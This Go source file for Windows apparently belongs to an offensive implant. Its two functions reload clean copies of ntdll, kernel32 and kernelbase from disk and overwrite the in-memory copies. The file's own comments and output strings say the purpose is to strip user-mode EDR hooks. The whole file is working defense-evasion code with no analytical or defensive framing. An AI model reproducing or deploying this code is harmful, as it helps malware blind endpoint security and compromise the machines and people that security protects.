//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// unhookNtdll reads a clean copy of ntdll.dll from disk, diffs it against the
// in-memory loaded copy, and patches any modified bytes back — effectively
// removing all user-mode EDR hooks that work by patching the .text section.
func unhookNtdll() (string, error) {
	ntdllPath := os.ExpandEnv(`${SystemRoot}\System32\ntdll.dll`)
	cleanData, err := os.ReadFile(ntdllPath)
	if err != nil {
		return "", fmt.Errorf("read ntdll from disk: %v", err)
	}

	// Get the in-memory ntdll base address
	ntdllMod, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return "", fmt.Errorf("LoadDLL ntdll: %v", err)
	}
	ntdllBase := uintptr(ntdllMod.Handle)

	// Parse the disk copy PE header
	if len(cleanData) < 0x40 {
		return "", fmt.Errorf("ntdll too small")
	}
	peOff     := int(binary.LittleEndian.Uint32(cleanData[0x3C:]))
	if len(cleanData) < peOff+24+240 {
		return "", fmt.Errorf("PE header OOB")
	}
	numSects  := int(binary.LittleEndian.Uint16(cleanData[peOff+6:]))
	sizeOfOpt := int(binary.LittleEndian.Uint16(cleanData[peOff+20:]))
	sectsOff  := peOff + 24 + sizeOfOpt

	totalPatched := 0
	patchedSects := 0

	for i := 0; i < numSects; i++ {
		s := sectsOff + i*40
		if s+40 > len(cleanData) {
			break
		}

		// Only process executable sections (IMAGE_SCN_MEM_EXECUTE = 0x20000000)
		characteristics := binary.LittleEndian.Uint32(cleanData[s+36:])
		if characteristics&0x20000000 == 0 {
			continue
		}

		// Read null-terminated section name (max 8 bytes)
		nameBytes := cleanData[s : s+8]
		end := 0
		for end < 8 && nameBytes[end] != 0 {
			end++
		}
		sectionName := string(nameBytes[:end])

		virtualAddr := binary.LittleEndian.Uint32(cleanData[s+12:])
		virtualSize := binary.LittleEndian.Uint32(cleanData[s+8:])
		rawOffset   := binary.LittleEndian.Uint32(cleanData[s+20:])
		rawSize     := binary.LittleEndian.Uint32(cleanData[s+16:])

		if int(rawOffset+rawSize) > len(cleanData) {
			continue
		}

		compareSize := rawSize
		if virtualSize < compareSize {
			compareSize = virtualSize
		}

		inMemBase := ntdllBase + uintptr(virtualAddr)
		diskSection := cleanData[rawOffset : rawOffset+compareSize]

		// Make memory writable
		var oldProtect uint32
		if err := windows.VirtualProtect(inMemBase, uintptr(compareSize),
			windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
			continue
		}

		// Patch byte-by-byte where disk and memory differ
		inMem := unsafe.Slice((*byte)(unsafe.Pointer(inMemBase)), compareSize)
		sectionPatched := 0
		for j := uint32(0); j < compareSize; j++ {
			if inMem[j] != diskSection[j] {
				inMem[j] = diskSection[j]
				sectionPatched++
			}
		}

		// Restore original protection
		windows.VirtualProtect(inMemBase, uintptr(compareSize), oldProtect, &oldProtect)

		if sectionPatched > 0 {
			patchedSects++
			totalPatched += sectionPatched
			_ = sectionName
		}
	}

	if totalPatched == 0 {
		return "[unhook] no hooks detected in ntdll — memory matches disk", nil
	}
	return fmt.Sprintf("[unhook] ntdll: restored %d byte(s) across %d section(s)\n[unhook] user-mode EDR hooks removed", totalPatched, patchedSects), nil
}

// unhookAll unhooks ntdll and additionally attempts to unhook kernel32/kernelbase.
func unhookAll() (string, error) {
	dlls := []string{
		`ntdll.dll`,
		`kernel32.dll`,
		`kernelbase.dll`,
	}
	var results []string
	for _, dll := range dlls {
		diskPath := os.ExpandEnv(`${SystemRoot}\System32\`) + dll
		cleanData, err := os.ReadFile(diskPath)
		if err != nil {
			continue
		}
		mod, err := windows.LoadDLL(dll)
		if err != nil {
			continue
		}
		base := uintptr(mod.Handle)

		peOff    := int(binary.LittleEndian.Uint32(cleanData[0x3C:]))
		if len(cleanData) < peOff+24+20 {
			continue
		}
		numSects := int(binary.LittleEndian.Uint16(cleanData[peOff+6:]))
		sizeOpt  := int(binary.LittleEndian.Uint16(cleanData[peOff+20:]))
		sectsOff := peOff + 24 + sizeOpt
		patched  := 0

		for i := 0; i < numSects; i++ {
			s := sectsOff + i*40
			if s+40 > len(cleanData) {
				break
			}
			if binary.LittleEndian.Uint32(cleanData[s+36:])&0x20000000 == 0 {
				continue
			}
			va  := binary.LittleEndian.Uint32(cleanData[s+12:])
			vsz := binary.LittleEndian.Uint32(cleanData[s+8:])
			raw := binary.LittleEndian.Uint32(cleanData[s+20:])
			rsz := binary.LittleEndian.Uint32(cleanData[s+16:])
			if int(raw+rsz) > len(cleanData) {
				continue
			}
			cmp := rsz
			if vsz < cmp {
				cmp = vsz
			}
			inMemBase := base + uintptr(va)
			disk := cleanData[raw : raw+cmp]
			var old uint32
			if err := windows.VirtualProtect(inMemBase, uintptr(cmp), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
				continue
			}
			mem := unsafe.Slice((*byte)(unsafe.Pointer(inMemBase)), cmp)
			for j := uint32(0); j < cmp; j++ {
				if mem[j] != disk[j] {
					mem[j] = disk[j]
					patched++
				}
			}
			windows.VirtualProtect(inMemBase, uintptr(cmp), old, &old)
		}

		if patched > 0 {
			results = append(results, fmt.Sprintf("  [%s] restored %d bytes", strings.ToLower(dll), patched))
		} else {
			results = append(results, fmt.Sprintf("  [%s] clean", strings.ToLower(dll)))
		}
	}

	return "[unhook-all]\n" + strings.Join(results, "\n"), nil
}
